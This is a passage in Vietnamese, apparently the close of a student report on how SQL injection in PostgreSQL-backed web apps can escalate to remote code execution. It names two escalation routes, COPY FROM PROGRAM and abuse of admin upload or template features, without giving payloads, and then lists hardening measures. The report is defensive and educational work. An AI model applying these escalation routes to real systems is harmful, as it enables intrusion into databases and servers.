Hướng 3: PostgreSQL COPY FROM PROGRAM → chạy OS command
Hướng 4: Admin upload/template → thực thi code ở tầng ứng dụng
```

Biện pháp phòng chống chính:

```text
1. Luôn dùng prepared statement / parameterized query.
2. Không nối chuỗi SQL với input người dùng.
3. Áp dụng least privilege cho database user.
4. Không dùng superuser cho web app.
5. Không cấp pg_execute_server_program nếu không thật sự cần.
6. Không cho app role tạo C function hoặc export file tùy ý.
7. Không cho upload file thực thi.
8. Tắt PHP execution trong thư mục uploads.
9. Tách vùng lưu dữ liệu khỏi vùng thực thi code.
```

Kết luận cuối cùng của nhóm em là:
**SQL Injection không chỉ là lỗi đọc hoặc sửa dữ liệu. Trong điều kiện quyền và cấu hình nguy hiểm, nó có thể trở thành một chuỗi tấn công dẫn tới Remote Code Execution. Vì vậy, chống SQLi phải đi cùng với phân quyền tối thiểu và hardening ở cả database, ứng dụng và web server.**
